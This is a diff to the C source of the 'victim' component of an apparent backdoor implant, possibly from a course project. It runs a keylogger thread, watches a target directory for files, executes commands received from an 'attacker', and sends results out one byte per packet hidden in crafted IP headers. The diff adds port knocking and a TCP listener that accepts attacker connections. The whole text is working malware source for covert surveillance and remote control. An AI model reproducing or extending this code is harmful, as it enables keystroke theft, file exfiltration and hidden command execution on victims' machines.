@@ -6,7 +6,7 @@
 
 int main(int argc, char *argv[]) {
     struct options_victim opts;
-    pthread_t keylogger_thread, cnc_thread, file_thread, select_thread;
+    pthread_t keylogger_thread, file_thread, select_thread;
     struct bpf_program fp;
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
     u_char* args = NULL;
@@ -18,12 +18,12 @@ int main(int argc, char *argv[]) {
     signal(SIGINT,sig_handler);
     program_setup();
     options_victim_init(&opts);
+
     create_socket(&opts, 'V', 'U', opts.dest_ip, ATC_UDP_PORT);
     create_socket(&opts, 'V', 'T', opts.dest_ip, ATC_TCP_PORT);
-    create_socket(&opts, 'V', 'R', opts.my_ip, VIC_FILE_PORT);
+//    create_socket(&opts, 'V', 'R', opts.my_ip, VIC_FILE_PORT);
     puts("============ Initialize VICTIM ============");
     fflush(stdout);
-
 
 
     if (pthread_create(&keylogger_thread, NULL, activate_keylogger, (void*)&opts) != 0) {
@@ -31,9 +31,13 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }
 
-
     if (pthread_create(&file_thread, NULL, check_directory, (void*)&opts) != 0) {
-        perror("pthread_create error: cnc_thread");
+        perror("pthread_create error: file_thread");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pthread_create(&select_thread, NULL, select_call, (void*)&opts) != 0) {
+        perror("pthread_create error: select_thread");
         exit(EXIT_FAILURE);
     }
 
@@ -156,14 +160,15 @@ void execute_instruction(u_char *args) {
     else if (strstr(ov->instruction, "target") != NULL) {
         strcpy(ov->target_directory, ov->instruction + 7);
         ov->target = TRUE;
+
+        // TODO: PORT OPEN
+        port_knock(ov->dest_ip, OPEN_ATF);
     }
     else {
-        // TODO: PORT KNOCK
         commands = split_line(ov->instruction);
         execute_command(commands, args);
         free(commands);
         send_to_attacker(args);
-        // TODO: PORT KNOCK CLOSE
     }
     memset(ov->instruction, 0, S_ARR_SIZE);
 }
@@ -303,6 +308,7 @@ void send_to_attacker(u_char *args) {
     opts = (struct options_victim*)args;
     length = (uint16_t) strlen(opts->sending_buffer);
 
+
     for (int j = 0; j < length; j++) {
         create_udp_header(&uh, VIC_UDP_PORT, ATC_UDP_PORT);
         create_ip_header(&ih, opts, 'V', opts->sending_buffer[j], 'U');
@@ -320,9 +326,10 @@ void send_to_attacker(u_char *args) {
 
 
 
-void* activate_keylogger(void* arg){
+void* activate_keylogger(void* arg) {
     struct options_victim* ov;
     ov = (struct options_victim*)arg;
+
     while(1) {
         if (ov->keylogger == TRUE) {
             break;
@@ -347,4 +354,83 @@ void* check_directory(void* arg) {
         track_file(ov);
         ov->target = FALSE;
     }
+}
+
+
+void* select_call(void* arg) {
+    struct options_victim* ov;
+
+    ov = (struct options_victim*) arg;
+    while(1) {
+        if (ov->target == TRUE) {
+            break;
+        }
+    }
+    create_socket(ov, 'V', 'R', ov->my_ip, VIC_FILE_PORT);
+    tcp_select(ov);
+}
+
+
+void tcp_select(struct options_victim* opts) {
+    fd_set reads, cpy_reads;
+    struct timeval timeout;
+    int fd_max, fd_num;
+    struct sockaddr_in client_address;
+    int client_address_size = sizeof(struct sockaddr_in);
+
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+
+    FD_ZERO(&reads);
+    FD_SET(opts->rtcp_socket, &reads);
+
+
+    while (1) {
+        cpy_reads = reads;
+        fd_max = get_max_socket_number(opts);
+        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
+        if (fd_num == -1) {
+            perror("Select() failed");
+            exit(EXIT_FAILURE);
+        }
+        else if (fd_num == 0) continue; // time out
+        for (int i = 0; i < fd_max + 1; i++) {
+            if (FD_ISSET(i, &cpy_reads)) {
+                if (i == opts->rtcp_socket) {
+                    opts->atcp_socket[0] = accept(opts->rtcp_socket, (struct sockaddr *)&client_address, &client_address_size);
+                    add_new_client(opts, opts->atcp_socket[0], &client_address);
+
+                    if (opts->rtcp_socket == -1) {
+                        printf("accept() error");
+                        exit(1);
+                    }
+                }
+            }
+        }
+    }
+}
+
+
+void add_new_client(struct options_victim *opts, int client_socket, struct sockaddr_in *new_client_address) {
+    char buffer[20];
+
+    inet_ntop(AF_INET, &new_client_address->sin_addr, buffer, sizeof(buffer));
+    printf("Attacker: [ %s ] connected\n", buffer);
+
+    opts->atcp_socket[opts->client_count] = client_socket;
+    opts->client_count++;
+    printf("Current client count = %d\n", opts->client_count);
+}
+
+
+
+int get_max_socket_number(struct options_victim *opts) {
+    // Minimum socket number start with server socket(opts->proxy_socket)
+    int max = opts->rtcp_socket;
+    if (opts->client_count == 1) {
+        max = opts->atcp_socket[0];
+    }
+
+    return max;
 }
